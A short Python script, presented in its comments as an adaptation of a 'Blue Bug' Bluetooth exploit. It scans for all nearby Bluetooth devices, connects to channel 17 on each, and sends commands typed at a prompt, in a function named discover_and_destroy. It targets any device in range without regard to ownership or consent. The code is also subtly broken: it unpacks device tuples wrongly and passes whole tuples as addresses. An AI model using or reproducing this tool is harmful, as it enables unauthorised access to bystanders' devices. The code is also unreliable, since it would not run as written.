# The Blue Bug exploit part mostly credited to user "zedspace", as I learned most everything I know about Bluetooth hacking via Python through his repos
# This script takes the exploit mentioned above, but instead of having to supply the BT address yourself, my script scans the nearby area and automatically inserts it, attempting to gain access to the hidden channel that some BT devices have inherently in their firmware

import lightblue
import bluetooth

def discover_and_destroy():
    # Discover nearby devices
    nearby_devices = bluetooth.discover_devices(duration=8, lookup_names=True, flush_cache=True, lookup_class=True)

    if not nearby_devices:
        print("No nearby devices found.")
        return

    print("Nearby Devices:")
    for address, name in nearby_devices:
        print(f"Address: {address}")
        print(f"Name: {name}")
        print("-" * 40)

    for address in nearby_devices:
      running = True
      channel = 17
      sock = lightblue.socket()
      sock.connect((address, channel))
      while running:
        cmd = input(">>> ")
        if cmd == "quit" or cmd == "exit":
          running = False
        else:
          sock.send(cmd)

      sock.close()
    

if __name__ == "__main__":
    print("Seeking Bluetooth devices to probe...")
    discover_and_destroy()
